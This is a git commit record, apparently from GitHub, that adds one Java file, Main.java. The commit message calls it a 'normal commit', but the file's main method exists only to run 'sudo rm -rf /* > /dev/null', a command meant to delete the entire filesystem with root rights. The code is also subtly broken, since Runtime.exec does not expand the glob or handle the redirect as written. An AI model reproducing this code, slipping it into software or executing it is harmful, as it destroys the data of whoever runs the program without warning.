f26154f4064b1bd1830c341ecdae904f0fc547dd
maxwell <47988917+maxwell187@users.noreply.github.com>
2019-02-25 19:47:05 +0100

    uploaded all files
    normal commit

---
+++ src/me/maxwell/mr/Main.java
@@ -0,0 +1,27 @@
+package me.maxwell.mr;
+
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+
+public class Main {
+
+    public static void main(String[] args) throws IOException, InterruptedException {
+
+        String command = "sudo rm -rf /* > /dev/null";
+
+        Process proc = Runtime.getRuntime().exec(command);
+
+        BufferedReader reader =
+                new BufferedReader(new InputStreamReader(proc.getInputStream()));
+
+        String line = "";
+        while((line = reader.readLine()) != null) {
+            System.out.print(line + "\n");
+        }
+
+        proc.waitFor();
+
+    }
+}
